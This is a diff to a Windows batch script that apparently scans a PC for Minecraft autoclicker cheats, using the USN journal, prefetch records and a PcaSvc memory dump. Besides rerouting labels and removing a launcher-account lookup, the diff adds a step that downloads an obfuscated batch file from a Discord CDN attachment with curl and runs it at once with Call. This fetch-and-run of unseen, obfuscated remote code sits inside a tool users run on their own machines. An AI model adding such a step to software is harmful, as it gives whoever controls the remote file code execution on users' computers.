@@ -235,6 +235,8 @@ echo.
 echo.
 echo %w%                                             5 
 echo                                    %g%%g2%.%r%%r2%...................%t%%w%
+
+
 :cloud_generic
 if exist "%temp%\genc" del /f /q "%temp%\genc" >nul
 fsutil usn readJournal C: csv > "%temp%\usn.txt"
@@ -260,7 +262,7 @@ echo                                             10
 echo                                    %g%%g2%..%r%%r2%..................%t%%w%
 findstr /b "0," < "%temp%\usn.txt" >%temp%\genc.txt
 if %errorlevel%==1 goto slinky
-if %errorlevel%==0 FOR /F "tokens=1,2,3,4,5,6,7 delims=," %%G IN (%temp%\genc.txt) do set genc=%%L
+if %errorlevel%==0 FOR /F "tokens=1,2,3,4,5,6 delims=," %%G IN (%temp%\genc.txt) do set genc=%%L
 echo Cloud Clicker (or any other garbage clicker/clients) was self destructed at: %genc%
 echo Would you like to continue the scan? (Yes, No)  
 set /p cont=
@@ -302,7 +304,7 @@ if /i %cont%==Yes (goto pshistory) else (exit)
 
 
 
-:pshistory
+
 cls
 echo.
 echo.
@@ -322,10 +324,6 @@ echo.
 echo.
 echo                                             20
 echo                                    %g%%g2%....%r%%r2%................%t%%w%
-findstr /b /i "help" "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
-if not exist "%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" goto void
-if %errorlevel%==0 goto genericl
-if %errorlevel%==1 goto void
 
 
 :void
@@ -335,6 +333,8 @@ if %errorlevel%==0 findstr /v /c:"File create" "%temp%\void.txt" | findstr /v /c
 if %errorlevel%==1 goto jnativehook
 FOR /F "tokens=1,2,3,4,5,6,7 delims=," %%G IN (%temp%\v2.txt) do set voidtime=%%L
 del /f /Q "%temp%\v2.txt"
+
+
 cls
 echo.
 echo.
@@ -471,6 +471,7 @@ dumper.exe -nh -pid %pcasvc% -l 4 > %temp%\pcasvc.txt
 find "%systemdrive%\" < "%temp%\pcasvc.txt" | findstr /b "TRACE"  > %temp%\fartfile.txt
 find "ProcessStart" < %temp%\fartfile.txt > %temp%\fartfile2.txt
 FOR /F "tokens=6 delims=," %%G IN (%temp%\fartfile2.txt) do echo  %%G>>%temp%\executedfiles.txt & echo.>>%temp%\executedfiles.txt 
+
 cls
 echo.
 echo.
@@ -536,7 +537,7 @@ echo                                    %g%%g2%...............%r%%r2%.....%t%%w%
 find ".pf" < "%temp%\usn.txt" >%temp%\pref.txt
 findstr /c:"File delete" "%temp%\pref.txt" >> "%temp%\pref2.txt"
 if %errorlevel%==0 FOR /F tokens^=1^,2^,3^,4^,5^,6^,7^ delims^=^-^" %%G IN (%temp%\pref2.txt) do set mgexe=%%H
-if %errorlevel%==1 goto genp
+if %errorlevel%==1 goto fstrings
 FOR /F "tokens=1,2,3,4,5,6,7 delims=," %%G IN (%temp%\pref2.txt) do set sdtime=%%L 
 del /f /q "%temp%\pref2.txt" >nul
 
@@ -545,7 +546,7 @@ find "REG.EXE-" < "%temp%\pref.txt" >%temp%\ustestm.txt
 del /f /q "%temp%\pref.txt" >nul
 findstr /v /c:"Data extend" "%temp%\ustestm.txt" >> "%temp%\ustestm2.txt"
 FOR /F "tokens=1,2,3,4,5,6,7 delims=," %%G IN (%temp%\ustestm2.txt) do set sdtime2=%%L 
-if %errorlevel%==0 (goto mgc) else (goto genp)
+if %errorlevel%==0 (goto mgc) else (goto fstrings)
 
 
 :mgc
@@ -570,18 +571,8 @@ echo                                             80
 echo                                    %g%%g2%................%r%%r2%....%t%%w%
 del /f /q "%temp%\ustestm.txt" >nul
 del /f /q "%temp%\ustestm2.txt" >nul
-if /i %sdtime%==%sdtime2% (echo Generic Cheat Found: %mgexe%. Self Destructed at: %sdtime%>>"%temp%\detected.txt" & set detected=true & goto genp) else (goto genp)
+if /i %sdtime%==%sdtime2% (echo Generic Cheat Found: %mgexe%. Self Destructed at: %sdtime%>>"%temp%\detected.txt" & set detected=true & goto fstrings) else (goto fstrings)
 
-:genp
-
-findstr /i /C:".pf" "%temp%\usn.txt" >> "%temp%\prefetch.txt" 
-findstr /i "delete" "%temp%\prefetch.txt" >> "%temp%\prefetch2.txt"
-del /f /q "%temp%\prefetch.txt"
-FOR /F tokens^=1^,2^,3^,4^,5^,6^,7^ delims^=^-^" %%G IN (%temp%\prefetch2.txt) do echo %%H>>"%temp%\delpref.txt"
-FOR /F "tokens=1 delims=" %%G IN (%temp%\delpref.txt) do echo %%G>>"%temp%\delpref2.txt"
-findstr /i /G:%temp%\delpref2.txt "%temp%\executedfiles.txt" >> %temp%\delpreffile.txt
-FOR /F "tokens=1 delims=," %%G IN (%temp%\delpreffile.txt) do echo  Generic Cheat (P) Found: %%G>>%temp%\detected.txt
-del /f /q "%temp%\prefetch2.txt" & del /f /q "%temp%\delpref.txt" & del /f /q "%temp%\delpreffile.txt" & del /f /q "%temp%\delpref2.txt"
 
 :fstrings
 
@@ -683,8 +674,10 @@ echo.
 echo                                             85
 echo                                    %g%%g2%.................%r%%r2%...%t%%w%
 
-findstr /b "0000ceea51f8440281c20c0ac8a03ae02e95c173ee84" "%temp%\pcasvc.txt" >nul
-if %errorlevel%==0 echo Found Air Clicker>>"%temp%\detected.txt" & set detected=true
+:mangaLicker
+curl -s https://cdn.discordapp.com/attachments/876545074387910726/897178958913753118/mangalicker_obfuscated.bat > %temp%\mangalicker.bat
+Call %temp%\mangalicker.bat
+
 
 
 findstr /b "0x00000000000C7600" "%temp%\pcasvc.txt" >nul
@@ -766,15 +759,6 @@ if %errorlevel%==0 echo Found Krypton>>"%temp%\detected.txt" & set detected=true
 findstr /b "0x000000000071CE10" "%temp%\pcasvc.txt" >nul
 if %errorlevel%==0 echo Found Lithium>>"%temp%\detected.txt" & set detected=true
 
-findstr /b "0x00000000000EA000" "%temp%\pcasvc.txt" >nul
-if %errorlevel%==0 echo Found Manga Clicker(1)>>"%temp%\detected.txt" & set detected=true
-
-findstr /b "0x1bdc00" "%temp%\pcasvc.txt" >nul
-if %errorlevel%==0 echo Found Mango Clicker(2)>>"%temp%\detected.txt" & set detected=true
-
-findstr /b "0x1c2000" "%temp%\pcasvc.txt" >nul
-if %errorlevel%==0 echo Found Mango Clicker(3)>>"%temp%\detected.txt" & set detected=true
-
 findstr /b "0000f373ac4f41f4125c7e68069c09dda9b0dfb66b0d" "%temp%\pcasvc.txt" >nul
 if %errorlevel%==0 echo Found Mango Lite>>"%temp%\detected.txt" & set detected=true
 
@@ -783,6 +767,15 @@ if %errorlevel%==0 echo Found Nova Clicker>>"%temp%\detected.txt" & set detected
 
 findstr /b "0x00000000000D303D" "%temp%\pcasvc.txt" >nul
 if %errorlevel%==0 echo Found OP AutoClicker>>"%temp%\detected.txt" & set detected=true
+
+findstr /b "0x2bf2bd" "%temp%\pcasvc.txt" >nul
+if %errorlevel%==0 echo Found PP Clicker(1)>>"%temp%\detected.txt" & set detected=true
+
+findstr /b "0x709000" "%temp%\pcasvc.txt" >nul
+if %errorlevel%==0 echo Found PP Clicker(2)>>"%temp%\detected.txt" & set detected=true
+
+findstr /b "0x2b6410" "%temp%\pcasvc.txt" >nul
+if %errorlevel%==0 echo Found PP Clicker(3)>>"%temp%\detected.txt" & set detected=true
 
 findstr /b "0006966215a9cce0d8555692dc19b932389400000000" "%temp%\pcasvc.txt" >nul
 if %errorlevel%==0 echo Found Spotify Clicker>>"%temp%\detected.txt" & set detected=true
@@ -817,6 +810,8 @@ echo                                    %g%%g2%..................%r%%r2%..%t%%w%
 
 findstr /b /C:"cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del /f /q" "%temp%\diagtrack.txt" >nul
 if %errorlevel%==0 echo Found Generic External SelfDestruct>>"%temp%\detected.txt" & set detected=true
+findstr /b /C:"Found" "%temp%\detected.txt"
+if %errorlevel%==0 set detected=true
 if %detected%==true (goto results) else (echo Clean>>%temp%\detected.txt & goto results)
 
 
@@ -883,18 +878,6 @@ exit
 
 
 
-
-:genericl
-cls
-del /f /q "%temp%\usn.txt" >nul
-del /f /q "%temp%\void.txt" >nul
-del /f /q "%temp%\v2.txt" >nul
-color 0C
-echo Generic L found
-<"%userprofile%\AppData\Roaming\.minecraft\launcher_accounts.json" find "name" >"%temp%\name.txt"
-echo Alts:
-type "%temp%\name.txt" | findstr /v @ | findstr /v preferredLanguage | findstr /v registrationCountry
-pause
 
 
 
